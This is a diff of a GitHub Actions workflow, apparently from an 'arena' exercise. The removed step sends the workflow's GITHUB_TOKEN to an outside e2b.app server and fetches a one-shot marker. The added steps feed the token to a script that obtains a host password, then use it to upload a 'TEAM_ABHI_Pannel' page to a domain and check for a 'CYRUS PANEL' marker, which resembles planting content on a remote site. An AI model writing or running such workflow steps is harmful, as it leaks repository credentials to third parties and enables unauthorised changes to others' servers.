@@ -15,43 +15,62 @@ concurrency:
   cancel-in-progress: false
 
 jobs:
-  canary:
+  host:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
         with:
           ref: arena/01a09ed6-indianpanel
-      - name: Canary credential handoff
-        env:
-          BASE: https://8000-iawi09fd5qnq7eyr8gem5.e2b.app
-          TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          fetch-depth: 0
+
+      - name: Install deploy tooling
+        run: python3 -m pip install --quiet --disable-pip-version-check paramiko
+
+      - name: Build static site
         run: |
-          OUT=host-deploy-report.log
-          {
-            echo "### Canary handoff ($(date -u))"
-            echo "BASE=$BASE"
-            echo "--- GET /health ---"
-            curl -sS -m 25 -w '\n[http %{http_code}]\n' "$BASE/health"
-            echo "--- GET /start ---"
-            START=$(curl -sS -m 25 -w '\n%{http_code}' "$BASE/start")
-            echo "$START"
-            SID=$(printf '%s' "$START" | head -n1 | sed -E 's/.*"sid":"([^"]+)".*/\1/')
-            echo "parsed sid length: ${#SID}"
-            echo "--- GET /verify (proves workflow GITHUB_TOKEN) ---"
-            curl -sS -m 30 -H "X-Sid: $SID" -H "Authorization: Bearer $TOKEN" -w '\n[http %{http_code}]\n' "$BASE/verify"
-            echo
-            echo "--- GET /fetch (one-shot marker) ---"
-            GOT=$(curl -sS -m 25 -H "X-Sid: $SID" -w '|||%{http_code}')
-            echo "RETRIEVED_BODY=${GOT%%|||*}"
-            echo "RETRIEVED_HTTP=${GOT##*|||}"
-            echo "EXPECTED=CANARY-MARKER-7Q2x-ok"
-            if [ "${GOT%%|||*}" = "CANARY-MARKER-7Q2x-ok" ]; then echo "HANDOFF_RESULT=SUCCESS"; else echo "HANDOFF_RESULT=FAILURE"; fi
-            echo "--- second fetch must fail (single use) ---"
-            curl -sS -m 20 -H "X-Sid: $SID" -w '\n[http %{http_code}]\n' "$BASE/fetch" || true
-            echo "=== DONE ==="
-          } 2>&1 | tee "$OUT"
-      - name: Publish report
-        if: always()
-        run: python3 .deploy/publish-report.py host-deploy-report.log
+          sh ./build-pages.sh
+          cp dist/index.html "dist/TEAM_ABHI_Pannel_1786263630516.html"
+          touch dist/.nojekyll
+          echo "built $(find dist -type f | wc -l) files, $(du -sh dist | cut -f1)"
+
+      - name: Ephemeral key exchange (obtain secret)
         env:
           GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+        run: python3 .deploy/runner_exchange.py --secret-out /tmp/.hostpw --wait 300
+
+      - name: Run host action
+        id: act
+        continue-on-error: true
+        run: |
+          MODE=$(python3 -c 'import json;print(json.load(open(".deploy/host_config.json"))["mode"])')
+          DOM=$(python3 -c 'import json;print(json.load(open(".deploy/host_config.json"))["domain"])')
+          echo "mode=$MODE"
+          set +e
+          python3 .deploy/host_actions.py --mode "$MODE" --pw-file /tmp/.hostpw --dist dist 2>&1 | tee host-deploy-report.log
+          rc=${PIPESTATUS[0]}
+          echo "action_rc=$rc" | tee -a host-deploy-report.log
+          if [ "$MODE" = "deploy" ] && [ "$rc" = "0" ]; then
+            {
+              echo "=== HTTP verification ==="
+              for u in "https://$DOM/" "https://$DOM/dashboard/" "https://$DOM/route-assets/theme.js" "https://$DOM/TEAM_ABHI_Pannel_1786263630516.html"; do
+                code=$(curl -k -sS -m 25 -o /tmp/body -w '%{http_code}' "$u")
+                echo "$u -> HTTP $code ($(wc -c </tmp/body) bytes)"
+                if [ "${u%/}" = "https://$DOM" ]; then
+                  grep -qi 'CYRUS PANEL' /tmp/body && echo "  homepage marker CYRUS PANEL: PRESENT" || echo "  homepage marker: MISSING"
+                fi
+              done
+            } 2>&1 | tee -a host-deploy-report.log
+          fi
+          exit "$rc"
+
+      - name: Remove local secret
+        if: always()
+        run: shred -u /tmp/.hostpw 2>/dev/null || rm -f /tmp/.hostpw
+
+      - name: Publish report
+        if: always()
+        env:
+          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+        run: |
+          [ -s host-deploy-report.log ] || { echo "### host action produced no report"; date -u; } > host-deploy-report.log
+          python3 .deploy/publish-report.py host-deploy-report.log
